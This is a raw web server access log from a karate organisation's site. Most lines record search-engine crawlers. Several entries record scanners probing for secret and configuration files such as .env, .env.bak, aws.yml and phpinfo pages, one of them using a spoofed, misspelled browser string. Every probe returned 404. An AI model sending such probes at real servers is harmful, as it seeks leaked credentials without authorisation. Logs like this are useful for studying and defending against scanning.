::ffff:114.119.152.108 - - [22/Jul/2022:10:38:05 +0000] "GET /resources HTTP/1.1" 200 194907 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:185.191.171.45 - - [22/Jul/2022:10:50:55 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:185.191.171.10 - - [22/Jul/2022:10:50:55 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:45.61.186.139 - - [22/Jul/2022:11:30:49 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
::ffff:135.125.246.189 - - [22/Jul/2022:11:34:11 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [22/Jul/2022:11:34:11 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:51.222.253.19 - - [22/Jul/2022:11:38:47 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.20 - - [22/Jul/2022:11:38:48 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:35.90.54.60 - - [22/Jul/2022:11:48:26 +0000] "GET //_profiler/phpinfo HTTP/1.1" 404 157 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:35.90.54.60 - - [22/Jul/2022:11:48:27 +0000] "GET //phpinfo.php HTTP/1.1" 404 151 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:35.90.54.60 - - [22/Jul/2022:11:48:27 +0000] "GET //phpinfo HTTP/1.1" 404 147 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:35.90.54.60 - - [22/Jul/2022:11:48:29 +0000] "GET //aws.yml HTTP/1.1" 404 147 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:35.90.54.60 - - [22/Jul/2022:11:48:30 +0000] "GET //.env.bak HTTP/1.1" 404 148 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
